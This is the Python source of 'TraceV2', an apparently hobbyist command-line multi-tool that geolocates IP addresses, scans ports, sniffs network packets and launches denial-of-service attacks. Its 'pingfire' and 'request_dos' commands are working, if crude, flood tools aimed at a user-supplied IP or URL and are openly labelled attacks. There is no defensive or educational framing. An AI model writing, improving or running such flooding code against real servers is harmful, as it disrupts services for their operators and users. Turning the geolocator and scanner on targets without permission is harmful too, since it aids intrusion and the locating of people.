import os
import subprocess
import sys
import time
import json
import requests
from urllib.request import urlopen
import re
import threading
import os.path
from colorama import Fore
from colorama import Style
import socket
from concurrent.futures import ThreadPoolExecutor
from scapy.all import sniff
import traceback

banner = """
████████╗██████╗  █████╗  ██████╗███████╗██╗   ██╗██████╗ 
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║   ██║╚════██╗
   ██║   ██████╔╝███████║██║     █████╗  ██║   ██║ █████╔╝
   ██║   ██╔══██╗██╔══██║██║     ██╔══╝  ╚██╗ ██╔╝██╔═══╝ 
   ██║   ██║  ██║██║  ██║╚██████╗███████╗ ╚████╔╝ ███████╗
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝  ╚═══╝  ╚══════╝                                                  
"""

welcomemessage = f"""
----------------------------------------------------------------------
//////////////////////////////////////////////////////////////////////

{Fore.RED}TRACEV2{Fore.WHITE} RELEASE 1.1.2
Windows IP geolocator and multi-tool.
Improved TraceV1, new and improved features.
Coded by {Fore.RED}@jasperthesillyy{Fore.WHITE} on discord.

//////////////////////////////////////////////////////////////////////
----------------------------------------------------------------------

Type "help" for a list of commands.
Type "clear" to clear the console.

-----------------------------------------------------------------------

"""

AllCommands = f"""
////////////////////////////
----------------------------
COMMANDS - {Fore.RED}TraceV2 1.1.2 {Fore.WHITE}
----------------------------
////////////////////////////

help - Displays all commands.
clear - Clears the console.
{Fore.CYAN}geolocator{Fore.WHITE} - Geolocator tool.
exit - Exit TraceV2.
displaymyip - Displays your ip adress.
{Fore.CYAN}rawjson_geolocator{Fore.WHITE} - Geolocator tool, but displays in the raw json format.
{Fore.RED}pingfire{Fore.WHITE} - Rapid server pinging tool, lightweight DOS.
{Fore.RED}request_dos{Fore.WHITE} - A tool that uses Requests (GET/POST) to perform a DOS attack.
{Fore.YELLOW}portscanner{Fore.WHITE} - A tool used to scan a target's ports.
{Fore.YELLOW}packetsniffer{Fore.WHITE} - A tool that is used to sniff traffic/packets on your network connection.
banner - Displays the{Fore.RED} TraceV2{Fore.WHITE} banner/welcome message.
changelog - Displays the new version changelog. (ver 1.0.1+)

"""

changelog = """
/////////////////////////////////////////////////////
-----------------------------------------------------
CHANGELOG - TraceV2 1.1.2
-----------------------------------------------------
/////////////////////////////////////////////////////

Added a port scanner.
Added a packet sniffing system.

------------------------------------------------------
//////////////////////////////////////////////////////

"""


def output_as_tracev2(text):
    print(f'{Fore.RED}[TraceV2]: {Fore.WHITE}' + text)


def getIP():
    try:
        d = str(urlopen('http://checkip.dyndns.com/').read())
        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)
        return ip
    except Exception as e:
        output_as_tracev2(f'Error retrieving IP address: {e}')
        return None


def main():
    os.system("chcp 65001")
    os.system('cls' if os.name == 'nt' else 'clear')

    print(f"{Fore.RED}{banner}{Fore.WHITE}")
    print(welcomemessage)

    while True:
        commandinput = input(f"{Fore.RED}[Command]: {Fore.WHITE}").lower().strip()

        if commandinput.lower() == "help":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(AllCommands)

        elif commandinput.lower() == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')

        elif commandinput.lower() == "exit":
            output_as_tracev2('Exiting...')
            sys.exit()

        elif commandinput.lower() == "banner":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{Fore.RED}{banner}{Fore.WHITE}")
            print(welcomemessage)

        elif commandinput.lower() == "rawjson_geolocator":
            try:
                output_as_tracev2('Starting RAWJSON_GEOLOCATOR...')
                ipadress_input = input(f'{Fore.CYAN}[IP]:{Fore.WHITE} ')
                time.sleep(0.5)
                made_request = requests.get(f'http://www.ipinfo.io/{ipadress_input}/json')
                text_req = made_request.text
                os.system('cls' if os.name == 'nt' else 'clear')
                output_as_tracev2('Found data.')
                print(text_req)
            except Exception as e:
                output_as_tracev2(f'Error in rawjson_geolocator: {e}')

        elif commandinput.lower() == "geolocator":
            try:
                output_as_tracev2('Starting geolocator...')
                time.sleep(0.5)
                geolocator_ip = input(f'{Fore.CYAN}[IP]:{Fore.WHITE} ')
                geolocator_request = requests.get(f'http://www.ipinfo.io/{geolocator_ip}')
                text_req = geolocator_request.text
                dataarray = json.loads(text_req)
                if 'error' in dataarray:
                    output_as_tracev2(f'Invalid IP! Error code: {dataarray["status"]}')
                else:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    output_as_tracev2('Found data!')
                    print(f'{Fore.CYAN}[IP]:{Fore.WHITE} {dataarray["ip"]}')
                    if 'hostname' in dataarray:
                        print(f'{Fore.CYAN}[HOSTNAME]:{Fore.WHITE} {dataarray["hostname"]}')
                    if 'city' in dataarray:
                        print(f'{Fore.CYAN}[CITY]:{Fore.WHITE} {dataarray["city"]}')
                    if 'region' in dataarray:
                        print(f'{Fore.CYAN}[REGION]:{Fore.WHITE} {dataarray["region"]}')
                    if 'country' in dataarray:
                        print(f'{Fore.CYAN}[COUNTRY]:{Fore.WHITE} {dataarray["country"]}')
                    if 'loc' in dataarray:
                        print(f'{Fore.CYAN}[COORDINATES(RAW)]:{Fore.WHITE} {dataarray["loc"]}')
                        b2 = dataarray['loc'].split(',')
                        print(f'{Fore.CYAN}[GEOLOCATION(GOOGLE MAPS)]:{Fore.WHITE} https://www.google.com/maps/?q={b2[0]},{b2[1]}')
                    if 'org' in dataarray:
                        print(f'{Fore.CYAN}[ORG]:{Fore.WHITE} {dataarray["org"]}')
                    if 'timezone' in dataarray:
                        print(f'{Fore.CYAN}[TIMEZONE]:{Fore.WHITE} {dataarray["timezone"]}')
            except Exception as e:
                output_as_tracev2(f'Error in geolocator: {e}')

        elif commandinput.lower() == "displaymyip":
            ip = getIP()
            if ip:
                output_as_tracev2(f'Your IP address is {ip}')

        elif commandinput.lower() == "changelog":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(changelog)

        elif commandinput.lower() == "pingfire":
            try:
                output_as_tracev2('Starting PingFire...')
                ip = input(f'{Fore.RED}[IP]: {Fore.WHITE}')
                output_as_tracev2('Starting attack...')

                def ping_target():
                    while True:
                        subprocess.Popen(['ping', ip])
                        time.sleep(0.05)

                ping_thread = threading.Thread(target=ping_target)
                ping_thread.start()

            except Exception as e:
                output_as_tracev2(f'Error in pingfire: {e}')
        elif commandinput.lower() == "request_dos":
            try:
                output_as_tracev2('Starting RequestDos...')
                ip = input(f'{Fore.RED}[URL]: {Fore.WHITE}')
                output_as_tracev2('Starting attack...')

                def sendrequeststo_get_target():
                    while True:
                        request = requests.get(ip)
                        print(f"{Fore.RED}[RDOS]:{Fore.WHITE} GET response hidden.")
                        time.sleep(0.05)

                def sendrequeststo_post_target():
                    while True:
                        postrequest = requests.post(ip, data={bytes("TRACEV2","utf-8"),bytes("TRACEV2","utf-8"),bytes("TRACEV2","utf-8")})
                        print(f"{Fore.RED}[RDOS]:{Fore.WHITE} POST response hidden.")
                        time.sleep(0.05)

                get_thread = threading.Thread(target=sendrequeststo_get_target())
                get_thread.start()

                post_thread = threading.Thread(target=sendrequeststo_post_target())
                post_thread.start()

            except Exception as e:
                output_as_tracev2(f'Error in request_dos: {e}')
        elif commandinput.lower() == "portscanner":
            def scan_port(ip, port):
                scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                scanner.settimeout(1)
                try:
                    result = scanner.connect_ex((ip, port))
                    if result == 0:
                        try:
                            service = socket.getservbyport(port)
                        except OSError:
                            service = "Unknown service"
                        print(f"{Fore.YELLOW}[PORTSCANNER]: {Fore.WHITE}Port {port} is open - Service: {service}")
                except Exception as e:
                    print(f"Error scanning port {port}: {e}")
                finally:
                    scanner.close()

            def port_scanner(ip, start_port, end_port):
                with ThreadPoolExecutor(max_workers=100) as executor:
                    for port in range(start_port, end_port + 1):
                        executor.submit(scan_port, ip, port)

            output_as_tracev2("Starting PortScanner...")
            ip = input(f"{Fore.YELLOW}[IP]:{Fore.WHITE} ")
            startingport = input(f"{Fore.YELLOW}[PORTSCANNER]:{Fore.WHITE} Starting port (Port to start scanning from): ")
            endport = input(f"{Fore.YELLOW}[PORTSCANNER]:{Fore.WHITE} End port (Port to end scanning at): ")
            print(f"{Fore.YELLOW}[PORTSCANNER]:{Fore.WHITE} Attempting to scan for ports..")
            os.system('cls' if os.name == 'nt' else 'clear')
            port_scanner(ip,int(startingport),int(endport))
        elif commandinput.lower() == "packetsniffer":
            output_as_tracev2("Starting PacketSniffer...")

            def process_packet(packet):
                try:
                    print(f"\n{Fore.YELLOW}[PACKETSNIFFER]: {Fore.WHITE}Packet Summary: {packet.summary()}")

                    if packet.haslayer("Ether"):
                        ether = packet.getlayer("Ether")
                        print(f"Ethernet Frame: {ether.src} -> {ether.dst} (Type: {hex(ether.type)})")

                    if packet.haslayer("IP"):
                        ip = packet.getlayer("IP")
                        print(f"IPv4 Packet: {ip.src} -> {ip.dst} (Protocol: {ip.proto}, TTL: {ip.ttl})")

                    if packet.haslayer("TCP"):
                        tcp = packet.getlayer("TCP")
                        print(f"TCP Segment: {tcp.sport} -> {tcp.dport} (Seq: {tcp.seq}, Ack: {tcp.ack})")

                    if packet.haslayer("UDP"):
                        udp = packet.getlayer("UDP")
                        print(f"UDP Segment: {udp.sport} -> {udp.dport} (Length: {udp.len})")

                    if packet.haslayer("ICMP"):
                        icmp = packet.getlayer("ICMP")
                        print(f"ICMP Packet: Type {icmp.type}, Code {icmp.code}")
                except Exception as e:
                    print(f"{Fore.YELLOW}[PACKETSNIFFER]: {Fore.WHITE}Error encountered: {str(e)}")
                    print(traceback.format_exc())

            def start_sniffing():
                try:
                    print(f"{Fore.YELLOW}[PACKETSNIFFER]: {Fore.WHITE}Starting packet sniffing...")
                    sniff(prn=process_packet, store=False)
                except Exception as e:
                    print(f"{Fore.YELLOW}[PACKETSNIFFER]: {Fore.WHITE}Error: {e}")
                    print(traceback.format_exc())

            start_sniffing()

        else:
            output_as_tracev2('Command not found, type "help" for a list of commands.')

if __name__ == "__main__":
    main()
